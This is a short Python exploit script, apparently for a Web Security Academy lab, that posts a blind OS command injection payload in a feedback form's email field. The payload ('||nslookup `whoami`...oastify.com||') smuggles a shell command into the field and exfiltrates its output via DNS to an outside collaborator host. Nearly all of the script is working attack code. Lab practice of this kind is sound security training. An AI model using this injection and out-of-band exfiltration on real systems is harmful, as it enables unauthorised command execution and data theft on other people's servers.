# Step 1: import the required used libraries.
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Avoid url warnings from showing.

# Step 2: Setting variables for the first request, this include sending the payload to the victim server
burp0_url = "https://0aa5007f03597b648050b7f700e400e1.web-security-academy.net:443/feedback/submit"

burp0_cookies = {"session": "zieGqDy3NOi7jQLrg2x5h70DCE2mCAWY"}

burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0aa5007f03597b648050b7f700e400e1.web-security-academy.net", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://0aa5007f03597b648050b7f700e400e1.web-security-academy.net/feedback", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=1", "Te": "trailers"}

burp0_data = {"csrf": "vZoalXMslnaN8TUcZC9z3akfa9y04unF", "name": "lol", "email": "||nslookup `whoami`.akijuhdfihgaaesdrgvsdeikhewrfjh.oastify.com||", "subject": "lol", "message": "aisuydygiuhe"}

# Step 3: set a post request with the request headers.
r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

# conditional statement to check for the validation of the exploit delivery.
if '200' in r.text:  
    print("[+] Exploit sent successfully, check the collaborator.")
else:
    print("[-] Exploit not sent successfully")
